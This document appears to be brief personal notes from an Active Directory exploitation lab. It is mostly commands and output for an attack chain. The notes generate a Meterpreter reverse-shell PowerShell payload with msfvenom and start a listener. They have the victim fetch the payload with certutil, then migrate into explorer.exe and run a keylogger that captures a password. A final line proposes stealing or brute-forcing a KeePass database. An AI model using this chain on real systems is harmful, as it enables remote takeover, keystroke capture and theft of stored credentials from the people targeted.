# Exploiting AD User

## Keylogger

attacker

```
# generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT="Listening port" -f psh -o shell.ps1

# listening server
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT "listening port'; exploit"


```

victime

```
certutil.exe -urlcache -split -f http:///shell.ps1
```

attacker

```
meterpreter\>ps | grep "explorer"
Filtering on 'explorer'

Process List
============

 PID   PPID  Name          Arch  Session  User                     Path
 ---   ----  ----          ----  -------  ----                     ----
 3612  3592  explorer.exe  x64   1        THMSERVER1\trevor.local  C:\Windows\explorer.exe
 
 meterpreter\>migrate 3612
[*] Migrating from 4408 to 3612...
[*] Migration completed successfully.

meterpreter\>getuid
Server username: THMSERVER1\trevor.local

Terminal
meterpreter\>keyscan_start
Starting the keystroke sniffer ...

Terminal
meterpreter\>keyscan_dump
Dumping captured keystrokes...
keep<CR>
<Shift>Passwordpasswordpassword<CR>
```

## Keepass

Steal Keepass database

* brute force password keepass or get it from the keylogger

